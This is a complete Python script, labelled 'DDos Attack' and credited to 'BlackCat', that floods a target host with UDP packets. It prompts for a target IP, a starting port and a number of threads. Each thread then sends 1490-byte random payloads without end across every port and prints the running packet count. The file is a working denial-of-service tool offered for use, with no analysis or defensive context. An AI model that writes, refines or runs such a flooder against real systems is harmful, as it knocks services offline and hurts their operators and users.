import sys
import os
import time
import socket
import random
import threading
from datetime import datetime

# Get current time
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

# Create a UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Generate random bytes
bytes_to_send = random._urandom(1490)

# Clear the screen and display a banner
os.system("clear")
os.system("figlet DDos Attack")
print("Author   : BlackCat")
print()

# Get target IP and port from user
ip_target = input("IP Target : ")
port_target = int(input("Port       : "))

# Clear the screen and display attack starting message
os.system("clear")
os.system("figlet Attack Starting")
print("[                    ] 0% ")
time.sleep(5)
print("[=====               ] 25%")
time.sleep(5)
print("[==========          ] 50%")
time.sleep(5)
print("[===============     ] 75%")
time.sleep(5)
print("[====================] 100%")
time.sleep(3)

# Initialize packet counter
sent_packets = 0

# Lock for thread-safe printing
print_lock = threading.Lock()

# Function to send packets
def send_packets(port):
    global sent_packets
    sock_local = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        try:
            sock_local.sendto(bytes_to_send, (ip_target, port))
            with print_lock:
                sent_packets += 1
                print(f"Sent {sent_packets} packets to {ip_target} through port: {port}")
            port += 1
            if port > 65535:
                port = 1
        except KeyboardInterrupt:
            print("\nAttack stopped by user.")
            break
        except Exception as e:
            with print_lock:
                print(f"An error occurred: {e}")
            break

# Create and start threads
num_threads = int(input("Number of threads: "))
threads = []
for i in range(num_threads):
    thread = threading.Thread(target=send_packets, args=(port_target + i,))
    thread.start()
    threads.append(thread)

# Wait for all threads to finish
for thread in threads:
    thread.join()
